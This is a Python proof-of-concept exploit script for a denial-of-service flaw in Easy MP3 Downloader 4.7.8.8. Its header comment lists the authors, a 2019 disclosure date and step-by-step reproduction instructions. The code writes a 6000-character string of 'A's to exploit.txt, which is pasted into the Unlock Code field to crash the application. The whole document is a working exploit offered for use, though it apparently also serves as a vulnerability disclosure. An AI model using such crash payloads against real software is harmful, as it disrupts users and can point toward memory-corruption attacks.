#!/usr/bin/python

# SWAMI KARUPASAMI THUNAI

 

print("""

############################################################################
###

# Exploit Title:        Easy MP3 Downloader Denial of Service

# Date:                 2019-08-29

# Exploit Author:       Mohan Ravichandran & Snazzy Sanoj

# Organization :        StrongBox IT

# Vulnerable Software:  Easy MP3 Downloader

# Version:              4.7.8.8

# Software Link:
https://download.cnet.com/Easy-MP3-Downloader/3000-2141_4-10860695.html

# Tested On:            Windows 10

#

# Credit to Snazzy Sanoj & Meshach for discovering the Vulnerbility

# Vulnerability Disclosure Date : 2019-08-29

#

# Manual steps to reproduce the vulnerability ... 

#1.  Download and install the setup file

#2.  Run this exploit code via python 2.7

#3.  A file "exploit.txt" will be created

#4.  Copy the contents of the file

#5.  While launching the application select Enter SN

#6.  Enter random string and press Ok

#7.  Then select manual option

#8.  Then Copy the contents of the exploit.txt and paste on the Unlock Code
field

#9.  Click Ok and voila ! :P Application crashes

############################################################################
###

""")

 

file = open("exploit.txt","wb")

junk = "A" * 6000

file.write(junk)

file.close()